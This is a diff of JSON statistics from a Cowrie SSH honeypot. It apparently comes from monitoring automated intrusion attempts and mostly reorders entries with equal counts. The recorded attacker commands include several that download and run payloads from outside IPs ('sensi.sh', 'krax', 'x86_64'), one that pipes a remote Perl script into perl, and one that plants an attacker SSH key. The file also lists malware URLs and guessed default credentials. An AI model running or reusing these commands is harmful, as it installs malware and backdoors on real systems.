@@ -35,11 +35,7 @@
       "count": 967
     },
     {
-      "input": "crontab -l",
-      "count": 961
-    },
-    {
-      "input": "w",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 961
     },
     {
@@ -47,7 +43,11 @@
       "count": 961
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "w",
+      "count": 961
+    },
+    {
+      "input": "crontab -l",
       "count": 961
     }
   ],
@@ -61,11 +61,11 @@
       "count": 13
     },
     {
-      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.58.203/ssh || curl -o ssh 209.141.58.203/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane 1",
+      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.52.40/sensi.sh; curl -O http://209.141.52.40/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 209.141.52.40 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 209.141.52.40; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.52.40 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *",
       "count": 3
     },
     {
-      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.52.40/sensi.sh; curl -O http://209.141.52.40/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 209.141.52.40 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 209.141.52.40; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.52.40 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *",
+      "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.58.203/ssh || curl -o ssh 209.141.58.203/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane 1",
       "count": 3
     },
     {
@@ -130,16 +130,16 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/83dbdf0c82272df4978c0bd6cae6c8f58b6f48f08ec64c219b5573432792f715",
+      "outfile": "var/lib/cowrie/downloads/bede3501d4f8037eda2d91f27a44340aca360953dc675d46277d4207da419973",
       "scans": {
         "positives": 0,
-        "total": 57
+        "total": 56
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/5586a566ff5d1e065080b8aeb870e9c4e739c43d77ddd7266fe508af651438ae",
+      "outfile": "var/lib/cowrie/downloads/ff2dccf8513743c8dd1b5fbc79b1fc83704bc64bda7db14fb5d4871efed6ed66",
       "scans": {
         "positives": 0,
         "total": 58
@@ -157,7 +157,7 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/ff2dccf8513743c8dd1b5fbc79b1fc83704bc64bda7db14fb5d4871efed6ed66",
+      "outfile": "var/lib/cowrie/downloads/5586a566ff5d1e065080b8aeb870e9c4e739c43d77ddd7266fe508af651438ae",
       "scans": {
         "positives": 0,
         "total": 58
@@ -166,10 +166,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/bede3501d4f8037eda2d91f27a44340aca360953dc675d46277d4207da419973",
+      "outfile": "var/lib/cowrie/downloads/83dbdf0c82272df4978c0bd6cae6c8f58b6f48f08ec64c219b5573432792f715",
       "scans": {
         "positives": 0,
-        "total": 56
+        "total": 57
       },
       "count": 1
     }
@@ -245,15 +245,15 @@
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 54
-    },
-    {
       "input": "uname -a",
       "count": 54
     },
     {
-      "input": "top",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 54
+    },
+    {
+      "input": "lscpu | grep Model",
       "count": 53
     },
     {
@@ -261,7 +261,7 @@
       "count": 53
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
       "count": 53
     }
   ],
@@ -279,11 +279,11 @@
       "count": 21
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "nproc;wget -qO - chairfiller.org/perlmeu|perl",
       "count": 5
     },
     {
-      "input": "nproc;wget -qO - chairfiller.org/perlmeu|perl",
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 5
     }
   ],
@@ -344,10 +344,10 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/0ecda3bc61f1503e078aa9a62e1ad0184c79c6cad83ee2de8fcc584e08bb2291",
+      "outfile": "var/lib/cowrie/downloads/6b5af577b815523a1abdd9f2787e303f98532584f1b4d81044072cc268c14b79",
       "scans": {
-        "positives": 0,
-        "total": 58
+        "positives": null,
+        "total": null
       },
       "count": 1
     },
@@ -362,10 +362,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/6b5af577b815523a1abdd9f2787e303f98532584f1b4d81044072cc268c14b79",
+      "outfile": "var/lib/cowrie/downloads/0ecda3bc61f1503e078aa9a62e1ad0184c79c6cad83ee2de8fcc584e08bb2291",
       "scans": {
-        "positives": null,
-        "total": null
+        "positives": 0,
+        "total": 58
       },
       "count": 1
     }
@@ -445,7 +445,7 @@
       "count": 422
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 420
     },
     {
@@ -453,7 +453,7 @@
       "count": 420
     },
     {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 420
     },
     {
@@ -471,11 +471,11 @@
       "count": 9
     },
     {
-      "input": "scp -t /var/tmp/clamav.pl",
+      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
       "count": 7
     },
     {
-      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
+      "input": "scp -t /var/tmp/clamav.pl",
       "count": 7
     },
     {
@@ -608,26 +608,18 @@
     },
     {
       "username": "root",
-      "password": "root",
+      "password": "admin",
       "count": 9
     },
     {
       "username": "root",
-      "password": "admin",
+      "password": "root",
       "count": 9
     }
   ],
   "commands": [
     {
-      "input": "ls -lh $(which ls)",
-      "count": 109
-    },
-    {
-      "input": "which ls",
-      "count": 109
-    },
-    {
-      "input": "crontab -l",
+      "input": "uname -a",
       "count": 109
     },
     {
@@ -635,7 +627,15 @@
       "count": 109
     },
     {
-      "input": "uname -a",
+      "input": "crontab -l",
+      "count": 109
+    },
+    {
+      "input": "which ls",
+      "count": 109
+    },
+    {
+      "input": "ls -lh $(which ls)",
       "count": 109
     }
   ],
@@ -649,7 +649,7 @@
       "count": 3
     },
     {
-      "input": "crontab -l",
+      "input": "top",
       "count": 1
     },
     {
@@ -657,7 +657,7 @@
       "count": 1
     },
     {
-      "input": "top",
+      "input": "crontab -l",
       "count": 1
     }
   ],
@@ -717,20 +717,20 @@
   ],
   "file_download": [
     {
-      "url": "http://71.127.148.69/.x/1sh",
-      "outfile": "var/lib/cowrie/downloads/7c8b1ee9c8b72aae908c4275bc425b7520c84630da89483ae4f38c977ac4d5e7",
-      "scans": {
-        "positives": 11,
-        "total": 58
-      },
-      "count": 1
-    },
-    {
       "url": "http://71.127.148.69/.x/2sh",
       "outfile": "var/lib/cowrie/downloads/585377407888c0c67400c98c7f82f778fe0a6de7aee7b2d4c8c455e4cf669118",
       "scans": {
         "positives": 11,
         "total": 53
+      },
+      "count": 1
+    },
+    {
+      "url": "http://71.127.148.69/.x/1sh",
+      "outfile": "var/lib/cowrie/downloads/7c8b1ee9c8b72aae908c4275bc425b7520c84630da89483ae4f38c977ac4d5e7",
+      "scans": {
+        "positives": 11,
+        "total": 58
       },
       "count": 1
     }
@@ -808,7 +808,7 @@
       "count": 342
     },
     {
-      "input": "top",
+      "input": "lscpu | grep Model",
       "count": 341
     },
     {
@@ -816,7 +816,7 @@
       "count": 341
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
       "count": 341
     }
   ],
@@ -899,19 +899,19 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/b3349591432656353242cd17ec1b0b3ebd2f6aeeac30e6323faf8f7a8d55ff7f",
+      "outfile": "var/lib/cowrie/downloads/ca4c98aff7b512163d0bb8c04f06431d84ced7e3051cae11e56a506f0723a6c0",
       "scans": {
         "positives": 0,
-        "total": 57
+        "total": 58
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/ca4c98aff7b512163d0bb8c04f06431d84ced7e3051cae11e56a506f0723a6c0",
+      "outfile": "var/lib/cowrie/downloads/b3349591432656353242cd17ec1b0b3ebd2f6aeeac30e6323faf8f7a8d55ff7f",
       "scans": {
         "positives": 0,
-        "total": 58
+        "total": 57
       },
       "count": 1
     }
@@ -999,11 +999,11 @@
       "count": 843
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "uname",
       "count": 841
     },
     {
-      "input": "uname",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 841
     }
   ],
@@ -1146,13 +1146,8 @@
       "count": 146
     },
     {
-      "username": "john",
-      "password": "john",
-      "count": 3
-    },
-    {
-      "username": "root",
-      "password": "123123123",
+      "username": "nobody",
+      "password": "nobody",
       "count": 3
     },
     {
@@ -1161,22 +1156,19 @@
       "count": 3
     },
     {
-      "username": "nobody",
-      "password": "nobody",
+      "username": "root",
+      "password": "123123123",
+      "count": 3
+    },
+    {
+      "username": "john",
+      "password": "john",
       "count": 3
     }
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
-      "count": 146
-    },
-    {
-      "input": "top",
-      "count": 146
-    },
-    {
-      "input": "uname",
+      "input": "lscpu | grep Model",
       "count": 146
     },
     {
@@ -1184,7 +1176,15 @@
       "count": 146
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "uname",
+      "count": 146
+    },
+    {
+      "input": "top",
+      "count": 146
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 146
     }
   ],
@@ -1198,11 +1198,11 @@
       "count": 3
     },
     {
-      "input": "exit",
+      "input": "rm -rf /var/tmp/dota*",
       "count": 1
     },
     {
-      "input": "rm -rf /var/tmp/dota*",
+      "input": "exit",
       "count": 1
     }
   ],
@@ -1235,7 +1235,7 @@
   ],
   "session_closed": [
     {
-      "src_ip": "103.77.36.39",
+      "src_ip": "118.193.80.106",
       "robot": true,
       "count": 100
     },
@@ -1245,7 +1245,7 @@
       "count": 100
     },
     {
-      "src_ip": "118.193.80.106",
+      "src_ip": "103.77.36.39",
       "robot": true,
       "count": 100
     },
@@ -1318,11 +1318,11 @@
       "count": 222
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 221
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 221
     },
     {
@@ -1486,11 +1486,7 @@
       "count": 639
     },
     {
-      "input": "crontab -l",
-      "count": 638
-    },
-    {
-      "input": "w",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 638
     },
     {
@@ -1498,7 +1494,11 @@
       "count": 638
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "w",
+      "count": 638
+    },
+    {
+      "input": "crontab -l",
       "count": 638
     }
   ],
@@ -1647,11 +1647,7 @@
       "count": 1570
     },
     {
-      "input": "w",
-      "count": 68
-    },
-    {
-      "input": "uname -m",
+      "input": "top",
       "count": 68
     },
     {
@@ -1659,7 +1655,11 @@
       "count": 68
     },
     {
-      "input": "top",
+      "input": "uname -m",
+      "count": 68
+    },
+    {
+      "input": "w",
       "count": 68
     }
   ],
@@ -1750,19 +1750,19 @@
       "count": 2
     },
     {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/436a4d9a9aeb8fed57c8418a05d374c5b23e5b94b6154706f1929c8294bd84d9",
+      "url": "http://narcio.com/perlmeu",
+      "outfile": "var/lib/cowrie/downloads/65194ae0cfa63603f8a5b07360bbe2a4d06e87e89f73fa912d76f9e97274c88e",
       "scans": {
-        "positives": 0,
+        "positives": 33,
         "total": 59
       },
       "count": 1
     },
     {
-      "url": "http://narcio.com/perlmeu",
-      "outfile": "var/lib/cowrie/downloads/65194ae0cfa63603f8a5b07360bbe2a4d06e87e89f73fa912d76f9e97274c88e",
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/436a4d9a9aeb8fed57c8418a05d374c5b23e5b94b6154706f1929c8294bd84d9",
       "scans": {
-        "positives": 33,
+        "positives": 0,
         "total": 59
       },
       "count": 1
@@ -1843,11 +1843,7 @@
       "count": 257
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
-      "count": 250
-    },
-    {
-      "input": "top",
+      "input": "lscpu | grep Model",
       "count": 250
     },
     {
@@ -1855,7 +1851,11 @@
       "count": 250
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
+      "count": 250
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 250
     }
   ],
@@ -1869,11 +1869,11 @@
       "count": 16
     },
     {
-      "input": "scp -t /var/tmp/clamav.pl",
+      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
       "count": 7
     },
     {
-      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
+      "input": "scp -t /var/tmp/clamav.pl",
       "count": 7
     },
     {
@@ -1938,19 +1938,19 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/274be850ef09e44521412ed6990c59cf199da06c24773facdc41317799fcc0ce",
+      "outfile": "var/lib/cowrie/downloads/8086b834c34bf70f58d0213dd1cc5f3c6ab8f2409f5d5196c6de542f09c7b67d",
       "scans": {
-        "positives": 0,
-        "total": 58
+        "positives": null,
+        "total": null
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/8086b834c34bf70f58d0213dd1cc5f3c6ab8f2409f5d5196c6de542f09c7b67d",
+      "outfile": "var/lib/cowrie/downloads/274be850ef09e44521412ed6990c59cf199da06c24773facdc41317799fcc0ce",
       "scans": {
-        "positives": null,
-        "total": null
+        "positives": 0,
+        "total": 58
       },
       "count": 1
     }
@@ -2026,11 +2026,11 @@
   ],
   "commands": [
     {
-      "input": "uname",
+      "input": "uname -a",
       "count": 238
     },
     {
-      "input": "uname -a",
+      "input": "uname",
       "count": 238
     },
     {
@@ -2038,11 +2038,11 @@
       "count": 236
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 235
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "lscpu | grep Model",
       "count": 235
     }
   ],
@@ -2202,11 +2202,7 @@
       "count": 227
     },
     {
-      "input": "top",
-      "count": 226
-    },
-    {
-      "input": "uname",
+      "input": "lscpu | grep Model",
       "count": 226
     },
     {
@@ -2214,7 +2210,11 @@
       "count": 226
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "uname",
+      "count": 226
+    },
+    {
+      "input": "top",
       "count": 226
     }
   ],
@@ -2296,20 +2296,20 @@
   ],
   "file_download": [
     {
-      "url": "http://152.89.239.4/x86_64",
-      "outfile": "var/lib/cowrie/downloads/101987ac290e3b1e0999b683626cb8c2233653fbb5412d8fc64c9ed896e80e01",
-      "scans": {
-        "positives": 37,
-        "total": 62
-      },
-      "count": 1
-    },
-    {
       "url": null,
       "outfile": "var/lib/cowrie/downloads/b52f04c1b8cb0ada5b123730fd4e1f049b2140b8cfdda016735155086d7d5097",
       "scans": {
         "positives": 0,
         "total": 59
+      },
+      "count": 1
+    },
+    {
+      "url": "http://152.89.239.4/x86_64",
+      "outfile": "var/lib/cowrie/downloads/101987ac290e3b1e0999b683626cb8c2233653fbb5412d8fc64c9ed896e80e01",
+      "scans": {
+        "positives": 37,
+        "total": 62
       },
       "count": 1
     }
@@ -2393,7 +2393,7 @@
       "count": 590
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "uname",
       "count": 587
     },
     {
@@ -2401,7 +2401,7 @@
       "count": 587
     },
     {
-      "input": "uname",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 587
     }
   ],
@@ -2541,13 +2541,8 @@
       "count": 6
     },
     {
-      "username": "developer",
-      "password": "developer",
-      "count": 5
-    },
-    {
-      "username": "sonar",
-      "password": "password",
+      "username": "mysql",
+      "password": "admin",
       "count": 5
     },
     {
@@ -2556,8 +2551,13 @@
       "count": 5
     },
     {
-      "username": "mysql",
-      "password": "admin",
+      "username": "sonar",
+      "password": "password",
+      "count": 5
+    },
+    {
+      "username": "developer",
+      "password": "developer",
       "count": 5
     }
   ],
@@ -2568,12 +2568,7 @@
       "count": 572
     },
     {
-      "src_ip": "41.249.250.209",
-      "dst_port": 2222,
-      "count": 50
-    },
-    {
-      "src_ip": "142.93.180.141",
+      "src_ip": "68.183.189.30",
       "dst_port": 2222,
       "count": 50
     },
@@ -2583,7 +2578,12 @@
       "count": 50
     },
     {
-      "src_ip": "68.183.189.30",
+      "src_ip": "142.93.180.141",
+      "dst_port": 2222,
+      "count": 50
+    },
+    {
+      "src_ip": "41.249.250.209",
       "dst_port": 2222,
       "count": 50
     }
@@ -2600,7 +2600,7 @@
       "count": 217
     },
     {
-      "src_ip": "142.93.180.141",
+      "src_ip": "68.183.189.30",
       "robot": true,
       "count": 50
     },
@@ -2610,7 +2610,7 @@
       "count": 50
     },
     {
-      "src_ip": "68.183.189.30",
+      "src_ip": "142.93.180.141",
       "robot": true,
       "count": 50
     }
@@ -2652,11 +2652,7 @@
       "count": 298
     },
     {
-      "input": "top",
-      "count": 297
-    },
-    {
-      "input": "uname -a",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 297
     },
     {
@@ -2664,7 +2660,11 @@
       "count": 297
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "uname -a",
+      "count": 297
+    },
+    {
+      "input": "top",
       "count": 297
     }
   ],
@@ -2817,11 +2817,11 @@
       "count": 337
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 336
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 336
     },
     {
@@ -2839,11 +2839,11 @@
       "count": 316
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cd /tmp; wget http://152.89.239.4/x86_64; chmod 777 *; ./x86_64 x86_wget; curl -O http://152.89.239.4/x86_64; chmod 777 *; ./x86_64 x86_curl",
       "count": 16
     },
     {
-      "input": "cd /tmp; wget http://152.89.239.4/x86_64; chmod 777 *; ./x86_64 x86_wget; curl -O http://152.89.239.4/x86_64; chmod 777 *; ./x86_64 x86_curl",
+      "input": "lscpu | grep Model",
       "count": 16
     },
     {
@@ -2975,27 +2975,27 @@
       "count": 12
     },
     {
-      "username": "minerstat",
-      "password": "msos",
+      "username": "root",
+      "password": "admin",
       "count": 6
     },
     {
-      "username": "root",
-      "password": "admin",
+      "username": "minerstat",
+      "password": "msos",
       "count": 6
     }
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo",
-      "count": 4
-    },
-    {
       "input": "uname -a",
       "count": 4
     },
     {
-      "input": "echo Hi | cat -n",
+      "input": "cat /proc/cpuinfo",
+      "count": 4
+    },
+    {
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 2
     },
     {
@@ -3003,13 +3003,13 @@
       "count": 2
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "echo Hi | cat -n",
       "count": 2
     }
   ],
   "pre_disconnect_command": [
     {
-      "input": "cat /proc/cpuinfo",
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 2
     },
     {
@@ -3017,15 +3017,15 @@
       "count": 2
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "cat /proc/cpuinfo",
       "count": 2
     },
     {
-      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
       "count": 1
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
       "count": 1
     }
   ],
@@ -3156,7 +3156,7 @@
       "count": 997
     },
     {
-      "input": "crontab -l",
+      "input": "uname -m",
       "count": 996
     },
     {
@@ -3164,7 +3164,7 @@
       "count": 996
     },
     {
-      "input": "uname -m",
+      "input": "crontab -l",
       "count": 996
     }
   ],
@@ -3337,11 +3337,11 @@
       "count": 815
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 814
     },
     {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 814
     },
     {
@@ -3515,7 +3515,7 @@
       "count": 572
     },
     {
-      "input": "ls -lh $(which ls)",
+      "input": "crontab -l",
       "count": 545
     },
     {
@@ -3523,7 +3523,7 @@
       "count": 545
     },
     {
-      "input": "crontab -l",
+      "input": "ls -lh $(which ls)",
       "count": 545
     }
   ],
@@ -3606,19 +3606,19 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/8406edaf4903f77c36f8a3cffe4ccf01962baf453f378d9dc64c0537f8cc574b",
+      "outfile": "var/lib/cowrie/downloads/838fcc8e07201a375e4c731ca6bbc56e1cf532f6752d49407e61a1ba51bbfca1",
       "scans": {
         "positives": 0,
-        "total": 57
+        "total": 60
       },
       "count": 1
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/838fcc8e07201a375e4c731ca6bbc56e1cf532f6752d49407e61a1ba51bbfca1",
+      "outfile": "var/lib/cowrie/downloads/8406edaf4903f77c36f8a3cffe4ccf01962baf453f378d9dc64c0537f8cc574b",
       "scans": {
         "positives": 0,
-        "total": 60
+        "total": 57
       },
       "count": 1
     }
@@ -3692,11 +3692,7 @@
       "count": 374
     },
     {
-      "input": "which ls",
-      "count": 372
-    },
-    {
-      "input": "crontab -l",
+      "input": "uname",
       "count": 372
     },
     {
@@ -3704,7 +3700,11 @@
       "count": 372
     },
     {
-      "input": "uname",
+      "input": "crontab -l",
+      "count": 372
+    },
+    {
+      "input": "which ls",
       "count": 372
     }
   ],
@@ -3857,7 +3857,7 @@
       "count": 65
     },
     {
-      "input": "uname -m",
+      "input": "top",
       "count": 63
     },
     {
@@ -3865,7 +3865,7 @@
       "count": 63
     },
     {
-      "input": "top",
+      "input": "uname -m",
       "count": 63
     }
   ],
@@ -4018,7 +4018,7 @@
       "count": 239
     },
     {
-      "input": "crontab -l",
+      "input": "uname -m",
       "count": 238
     },
     {
@@ -4026,7 +4026,7 @@
       "count": 238
     },
     {
-      "input": "uname -m",
+      "input": "crontab -l",
       "count": 238
     }
   ],
@@ -4044,11 +4044,11 @@
       "count": 3
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
       "count": 1
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 1
     }
   ],
@@ -4175,11 +4175,7 @@
       "count": 101
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 100
-    },
-    {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "which ls",
       "count": 100
     },
     {
@@ -4187,7 +4183,11 @@
       "count": 100
     },
     {
-      "input": "which ls",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 100
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 100
     }
   ],
@@ -4205,11 +4205,11 @@
       "count": 2
     },
     {
-      "input": "nproc;wget -qO - chairfiller.org/perlmeu|perl",
+      "input": "which ls",
       "count": 1
     },
     {
-      "input": "which ls",
+      "input": "nproc;wget -qO - chairfiller.org/perlmeu|perl",
       "count": 1
     }
   ],
@@ -4331,13 +4331,13 @@
       "count": 12
     },
     {
-      "username": "ubuntu",
-      "password": "ubuntu",
+      "username": "minerstat",
+      "password": "msos",
       "count": 7
     },
     {
-      "username": "minerstat",
-      "password": "msos",
+      "username": "ubuntu",
+      "password": "ubuntu",
       "count": 7
     }
   ],
@@ -4351,11 +4351,11 @@
       "count": 18
     },
     {
